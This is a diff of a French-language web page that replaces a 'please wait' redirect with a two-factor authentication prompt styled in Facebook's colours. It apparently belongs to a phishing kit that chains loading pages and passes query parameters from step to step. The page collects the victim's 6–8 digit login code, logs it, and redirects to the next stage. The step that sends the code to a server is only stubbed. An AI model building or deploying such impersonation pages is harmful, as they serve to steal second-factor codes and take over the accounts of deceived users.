@@ -2,64 +2,194 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Veuillez patienter...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vérification de sécurité</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
 
         :root {
-            --primary: #0066CC;
-            --light-gray: #F5F7FA;
-            --text: #333333;
+            --fb-blue: #1877F2;
+            --fb-gray: #F0F2F5;
+            --text-primary: #1C1E21;
+            --text-secondary: #606770;
+            --border-color: #dddfe2;
+            --error-color: #fa383e;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
         }
 
         body {
-            background-color: var(--light-gray);
-            color: var(--text);
-            font-family: 'Roboto', sans-serif;
+            background-color: var(--fb-gray);
+            color: var(--text-primary);
+            width: 100vw;
+            height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            margin: 0;
+            padding: 15px;
         }
 
-        .loader {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid var(--primary);
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1.5s linear infinite;
+        .auth-container {
+            background-color: white;
+            padding: 25px 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            width: 100%;
+            max-width: 420px; /* Slightly wider for this content */
+            text-align: left; /* Align text to left for instructions */
+        }
+        
+        .auth-header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .auth-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-primary);
         }
 
-        .loading-text {
-            font-size: 22px;
+        .auth-instruction {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        
+        .input-label {
+            font-size: 14px;
             font-weight: 500;
-            margin-top: 25px;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            display: block;
         }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            font-size: 16px;
+            background-color: #FFFFFF; /* White background for code input */
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            margin-bottom: 15px;
+            display: none; /* Hidden by default */
+        }
+
+        .auth-actions {
+            display: flex;
+            justify-content: flex-end; /* Align buttons to the right */
+            align-items: center;
+            padding-top: 15px;
+            border-top: 1px solid var(--border-color);
+            margin-top: 20px;
+        }
+
+        .btn {
+            border: none;
+            padding: 10px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+
+        .btn-primary {
+            background-color: var(--fb-blue);
+            color: white;
+        }
+        
+        .btn-secondary {
+            background-color: var(--fb-gray);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+        
+        .resend-link {
+            font-size: 14px;
+            color: var(--fb-blue);
+            text-decoration: none;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p class="loading-text">Veuillez patienter...</p>
+    <div class="auth-container">
+        <div class="auth-header">
+            <div class="auth-title">Authentification à deux facteurs requise</div>
+        </div>
+        
+        <p class="auth-instruction">
+            Vous avez demandé une authentification à deux facteurs. Saisissez le code à 6 ou 8 chiffres généré par votre application d’authentification ou celui que nous vous avons envoyé par SMS.
+        </p>
+        
+        <form id="2faForm">
+            <div>
+                <label for="auth-code" class="input-label">Code de connexion</label>
+                <input type="text" id="auth-code" name="auth-code" class="input-field" placeholder="Code à 6 ou 8 chiffres" required pattern="\d{6,8}">
+            </div>
+            <div class="error-message" id="errorMessage">Veuillez saisir un code valide.</div>
+
+            <div class="auth-instruction" style="font-size: 13px; margin-top: 5px;">
+                Saisissez le code que nous avons envoyé au numéro se terminant par ** (ou utilisez vos codes de secours).
+            </div>
+            
+            <a href="#" class="resend-link">Vous n'avez pas reçu de code ?</a>
+
+            <div class="auth-actions">
+                <button type="button" class="btn btn-secondary">Annuler</button>
+                <button type="submit" class="btn btn-primary">Envoyer</button>
+            </div>
+        </form>
+    </div>
 
     <script>
-        function redirect() {
-            // Get query parameters from the current URL
-            const queryString = window.location.search;
-            // Redirect to the next page, preserving the query parameters
-            window.location.href = 'traitement2.html' + queryString;
-        }
+        const form = document.getElementById('2faForm');
+        const codeInput = document.getElementById('auth-code');
+        const errorMessage = document.getElementById('errorMessage');
 
-        // Wait for 10 seconds (10000 milliseconds) before redirecting
-        setTimeout(redirect, 10000);
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission for now
+            
+            // Basic validation for 6 or 8 digits
+            if (/^\d{6,8}$/.test(codeInput.value)) {
+                errorMessage.style.display = 'none';
+                // Here you would typically send the code to a server for verification
+                // For this example, we'll just log it and simulate success
+                console.log("Code soumis:", codeInput.value);
+                // On success, redirect to the next step
+                window.location.href = 'loading1.html' + window.location.search; 
+            } else {
+                errorMessage.textContent = 'Veuillez saisir un code valide à 6 ou 8 chiffres.';
+                errorMessage.style.display = 'block';
+                codeInput.focus();
+            }
+        });
     </script>
 </body>
 </html>
